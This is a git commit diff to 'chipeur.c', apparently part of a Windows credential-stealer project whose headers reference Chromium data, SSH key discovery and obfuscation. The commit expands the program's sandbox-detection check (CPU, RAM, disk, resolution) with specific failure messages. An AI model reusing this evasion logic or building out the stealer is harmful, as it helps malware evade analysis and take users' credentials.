d5d83c5a2dbd0f43c81cde3df9dee6d0879a230d
Hilan Meyran <hilanmeyran@protonmail.com>
2025-02-11 13:01:44 +0100

    handle precise error codes

--- src/chipeur.c
+++ src/chipeur.c
@@ -5,9 +5,9 @@
 #include <string.h>
 #include <windows.h>
 
-#include "hardware_requirements.h"
 #include "chromium.h"
 #include "find_ssh_key.h"
+#include "hardware_requirements.h"
 #include "obfuscation.h"
 
 void hello(void) { printf("Hello World\n"); }
@@ -18,8 +18,19 @@ int main(void) {
   SetConsoleOutputCP(CP_UTF8);
 
   // Stop if sandbox detected
-  if (check_hardware() == EXIT_FAILURE){
-    fprintf(stderr, "Hardware requirements check Failed: ");
+  int return_code = check_hardware();
+  if (return_code != EXIT_SUCCESS) {
+    fprintf(stderr, "Hardware requirements check failed. Reason: ");
+    switch (return_code) {
+      case EXIT_CPU_FAIL: fprintf(stderr, "CPU check failed.\n"); break;
+      case EXIT_RAM_FAIL: fprintf(stderr, "RAM check failed.\n"); break;
+      case EXIT_HDD_FAIL: fprintf(stderr, "HDD check failed.\n"); break;
+      case EXIT_RESOLUTION_FAIL:
+        fprintf(stderr, "Resolution check failed.\n");
+        break;
+      default: fprintf(stderr, "Unknown check failed.\n"); break;
+    }
+    fprintf(stderr, "Now exiting...");
     return EXIT_FAILURE;
   }
 
